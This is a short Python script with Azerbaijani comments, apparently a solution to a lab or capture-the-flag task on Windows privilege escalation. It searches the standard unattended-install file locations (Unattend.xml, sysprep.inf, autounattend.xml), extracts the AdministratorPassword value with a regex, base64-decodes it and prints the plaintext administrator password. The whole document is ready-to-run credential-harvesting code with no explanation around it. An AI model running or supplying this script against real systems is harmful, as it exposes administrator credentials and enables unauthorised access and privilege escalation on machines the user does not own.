import os
import re
import base64

def find_unattended_file():
    # Tapşırıqda qeyd olunan tipik yerlər və fayl adları
    possible_paths = [
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\unattend.xml",
        r"C:\Windows\System32\sysprep\unattend.xml",
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\unattend.xml",
        r"C:\autounattend.xml"
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

def extract_password(file_path):
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            
        # Regex vasitəsilə <AdministratorPassword> daxilindəki <Value>-ni tapmaq
        match = re.search(r"<AdministratorPassword>.*?<Value>(.*?)</Value>", content, re.DOTALL | re.IGNORECASE)
        if match:
            return match.group(1).strip()
    except Exception as e:
        print(f"Xeta bas verdi: {e}")
    return None

def main():
    file_path = find_unattended_file()
    if not file_path:
        print("Unattended fayl tapilmadi.")
        return
        
    encoded_pw = extract_password(file_path)
    if encoded_pw:
        # Base64 padding (beraberlik "=") tamamlama
        padding = len(encoded_pw) % 4
        if padding:
            encoded_pw += "=" * (4 - padding)
            
        # Dekodlasdirma
        decoded_pw = base64.b64decode(encoded_pw).decode("utf-8")
        print(decoded_pw)
    else:
        print("Sifre teqi tapilmadi.")

if __name__ == "__main__":
    main()
